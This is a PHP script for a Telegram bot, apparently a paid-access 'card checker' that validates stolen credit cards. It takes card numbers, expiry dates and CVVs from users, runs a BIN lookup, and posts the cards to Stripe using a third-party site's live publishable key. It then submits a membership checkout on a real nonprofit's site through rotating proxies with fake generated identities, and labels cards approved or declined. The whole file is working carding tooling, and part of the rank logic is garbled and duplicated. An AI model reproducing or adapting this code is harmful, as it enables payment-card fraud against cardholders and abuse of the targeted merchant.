  <?php
  //=========RANK DETERMINE=========//
  $currentDate = date('Y-m-d');
      $rank = "FREE";
      $expiryDate = "0";

      $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
      $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
      $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

$gate = "𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙕𝙀 𝙉𝙀𝙏 7$";

      if(in_array($userId, $owners)) {
          $rank = "OWNER";
         $expiryDate = "UNTIL DEAD"; 
      } else { 
          foreach ($paidUsers as $index => $line) {
              list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
              if ($userIdFromFile == $userId) {
                  if ($userExpiryDate < $currentDate) {
                      unset($paidUsers[$index]); //
                      file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                      $freeUsers[] = $userId; // add to free users list
                      file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                  } else    $currentDate = date('Y-m-d');
      $rank = "FREE";
      $expiryDate = "0";

      $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
      $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
      $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

      if(in_array($userId, $owners)) {
          $rank = "OWNER";
         $expiryDate = "UNTIL DEAD"; 
      } else {
          foreach ($paidUsers as $index => $line) {
              list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
              if ($userIdFromFile == $userId) {
                  if ($userExpiryDate < $currentDate) {
                      unset($paidUsers[$index]); 
                      file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                      $freeUsers[] = $userId; 
                      file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                  } else {
                      $rank = "PAID";
                      $expiryDate = $userExpiryDate;
                  }
              }
          }
      } {
                      $rank = "PAID";
                      $expiryDate = $userExpiryDate;
                  }
              }
          }
      }
  //=======RANK DETERMINE END=========//
  $update = json_decode(file_get_contents("php://input"), TRUE);
  $text = $update["message"]["text"];
  //========WHO CAN CHECK FUNC========//

  //=====WHO CAN CHECK FUNC END======//
  if (preg_match('/^(\/asd|\.asd|!asd)/', $text)) {
      $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username 𝘠𝘖𝘜 𝘈𝘙𝘌 𝘕𝘖𝘛 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘜𝘚𝘌𝘙  ❌</b>", $message_id);
        exit();
    }
  $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
      $message_id = $update["message"]["message_id"];
      $keyboard = "";

  //=======WHO CAN CHECK END========//

  //====ANTISPAM AND WRONG FORMAT====//
      if (strlen($message) <= 4) {
              sendMessage($chatId, '!<b>• 𝚈𝚘𝚞 𝙳𝚞𝚖𝚋 𝙰𝚜𝚜 𝙷𝚘𝚕𝚎 ! </b>         𝚃𝚎𝚡𝚝 𝚂𝚑𝚘𝚞𝚕𝚍 𝙾𝚗𝚕𝚢 𝙲𝚘𝚗𝚊𝚝𝚒𝚗 <code>/asd cc|mm|yy|cvv</code>%0A𝙶𝚊𝚝𝚎𝚠𝚊𝚢 - <b>𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙕𝙀 𝙉𝙀𝙏 7$</b>', $message_id);
              exit();
    }
  $r = "0";

  $r = rand(0, 100);
  //==ANTISPAM AND WRONG FORMAT END==//


  //=======checker part start========//
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
      extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
      extract($_GET);
  }
  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }


  $lista = substr($message, 5);
  $separa = explode("|", $lista);
  $cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
  $mes = isset($separa[1]) ? $separa[1] : '';
  $ano = isset($separa[2]) ? $separa[2] : '';
  $cvv = isset($separa[3]) ? $separa[3] : '';


  $last4 = substr($cc, -4);


  $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>𝚆𝙰𝙸𝚃 𝙳𝙾𝙸𝙽𝙶 𝚂𝙴𝚇 𝚂𝚄𝚇🎃</b>");

  function value($str,$find_start,$find_end)
  {
      $start = @strpos($str,$find_start);
      if ($start === false) 
      {
          return "";
      }
      $length = strlen($find_start);
      $end    = strpos(substr($str,$start +$length),$find_end);
      return trim(substr($str,$start +$length,$end));
  }

  function mod($dividendo,$divisor)
  {
      return round($dividendo - (floor($dividendo/$divisor)*$divisor));
  }
  //================[Functions and Variables]================//
  #------[Email Generator]------#



  function emailGenerate($length = 10)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
  }
  $email = emailGenerate();
  #------[Username Generator]------#
  function usernameGen($length = 13)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $un = usernameGen();
  #------[Password Generator]------#
  function passwordGen($length = 15)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $pass = passwordGen();

  #------[CC Type Randomizer]------#

   $cardNames = array(
      "3" => "American Express",
      "4" => "Visa",
      "5" => "MasterCard",
      "6" => "Discover"
   );
   $card_type = $cardNames[substr($cc, 0, 1)];





    //==================[Randomizing Details]======================//


  //==============[Randomizing Details-END]======================//



    //==================[BIN LOOK-UP]======================//

    $ch = curl_init();

    $bin = substr($cc, 0, 6);

    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $alpha2 = $binna['country']['alpha2'];
    $emoji = $binna['country']['emoji'];
    $type = $binna['type'];
    $category = $binna['category'];
    $bank = $binna['bank']['name'];
    $url = $binna['bank']['url'];
    $phone = $binna['bank']['phone'];
    curl_close($ch);

    $bank = "$bank";
    $country = "$country $emoji ";
    $bin = "$bin - ($alpha2) -[$emoji] ";
    $bininfo = "$type - $brand - $category";
    $url = "$url";
    $type = strtoupper($type);

  //==================[BIN LOOK-UP-END]======================//



    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");

  //=======================[5 REQ]==================================//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Host: api.stripe.com';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: en-US,en;q=0.8';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Path: /v1/payment_methods';
  $headers[] = 'Origin: https://js.stripe.com';
  $headers[] = 'Referer: https://js.stripe.com/';
  $headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
  $headers[] = 'sec-ch-ua-mobile: ?0';
  $headers[] = 'sec-ch-ua-platform: "Windows"';
  $headers[] = 'Sec-Fetch-Dest: empty';
  $headers[] = 'Sec-Fetch-Mode: cors';
  $headers[] = 'Sec-Fetch-Site: same-site';
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=407&billing_details[address][line2]=&billing_details[address][city]=New+York&billing_details[address][state]=NY&billing_details[address][postal_code]=10080&billing_details[address][country]=GB&billing_details[name]=broken+noob&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1fa816a3-cb1f-4128-be42-7282b81afcb1a3a78f&muid=091ef4ef-53ec-4eb1-b820-e439c1ec558bc2974e&sid=9870d8b5-fe95-4ee0-ba42-a8ba3a30ed0586fac6&pasted_fields=number&payment_user_agent=stripe.js%2F5816dc8686%3B+stripe-js-v3%2F5816dc8686%3B+split-card-element&referrer=https%3A%2F%2Fwww.thisissoutheastasia.com&time_on_page=294947&key=pk_live_51JkLk2JIyVIAYeSHZ2I2cfPy9kbtACHQm6L4iXKo7UrmGhIfYMbY0uOTplvTqCcbmuIRSSz4Al0VPaQw0RfXk7VS00wReSLMS5&_stripe_account=acct_1JkLk2JIyVIAYeSH');

  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
  $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

    sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");

  //==================req 1 end===============//
  //==================req 2===============//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://transfamilies.org/es/membership-account/membership-checkout/?level=3');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array(
    'authority: transfamilies.org',
    'method: POST',
    'path: /es/membership-account/membership-checkout/?level=3',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'cnntent-Type: application/x-www-form-urlencoded',
    'origin: https://transfamilies.org',
    'referer: https://transfamilies.org/es/membership-account/membership-checkout/?level=3',
    'sec-Fetch-Dest: document',
    'sec-Fetch-Mode: navigate',
    'sec-Fetch-Site: same-origin',
    'user-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    );

sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");


  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=3&checkjavascript=1&username='.$pass.'&password=abhyan3434&password2=abhyan3434&first_name=broken&last_name=noob&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname='.$pass.'&blastname='.$pass.'&baddress1=407&baddress2=&bcity=New+York&bstate=NY&bzipcode=10080&bcountry=GB&bphone=0+%28963%29+258-1470&CardType='.$card_type.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'&CVV='.$cvv.'&submit-checkout=1&javascriptok=1&trp-form-language=es');


  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  $result2 = curl_exec($ch);
  $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

  //==================req 2 end===============//



    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");

    //======checker part end=========//
$end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);


  if (
      strpos($result2, 'Thank you for your membership.') !== false ||
      strpos($result2, "Membership Confirmation") !== false ||
      strpos($result2, 'Your card zip code is incorrect.') !== false ||
      strpos($result2, "Thank You For Donation.") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Success ") !== false || strpos($result2, "/donations/thank_you?donation_number=") !== false
  ) {
    $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
[×] 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
[×] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
[×] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
[×] 𝐂𝐨𝐝𝐞 ↯ [/asd]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
[×] 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
[×] 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
[×] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]
⌬ $botu";
  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
      strpos($result2, "Your card does not support this type of purchase.") !== false ||
      strpos($result2, 'transaction_not_allowed') !== false ||
      strpos($result2, "insufficient_funds") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Your card has insufficient funds.") !== false ||
      strpos($result2, '"status":"success"') !== false ||
      strpos($result2, "stripe_3ds2_fingerprint") !== false
  ) {
  $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
[×] 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
[×] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
[×] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
[×] 𝐂𝐨𝐝𝐞 ↯ [/asd]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
[×] 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
[×] 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
[×] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]
⌬ $botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'security code is incorrect.') !== false ||
      strpos($result2, 'security code is invalid.') !== false ||
      strpos($result2, "Your card's security code is incorrect.") !== false
  ) {
  $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
[×] 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
[×] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
[×] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
[×] 𝐂𝐨𝐝𝐞 ↯ [/asd]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
[×] 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
[×] 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
[×] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]
⌬ $botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
  $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
[×] 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
[×] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
[×] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
[×] 𝐂𝐨𝐝𝐞 ↯ [/asd]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
[×] 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
[×] 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
[×] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]
⌬ $botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
  $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
[×] 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
[×] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
[×] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
[×] 𝐂𝐨𝐝𝐞 ↯ [/asd]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
[×] 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
[×] 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
[×] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]
⌬ $botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  else {
  $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌
✘ »--»--•--«--«⋆Card Info⋆»--»--•--«--« ✘
[×] 𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
[×] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ $gate
[×] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ $msg
[×] 𝐂𝐨𝐝𝐞 ↯ [/asd]

✘ »--»--•--«--« ⋆Bin Info⋆ »--»--•--«--« ✘
[×] 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
[×] 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
[×] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

✘ »--»--•--«--« ⋆Data⋆ »--»--•--«--« ✘
⌬ 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
⌬ 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
⌬ 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]
⌬ $botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }
  }
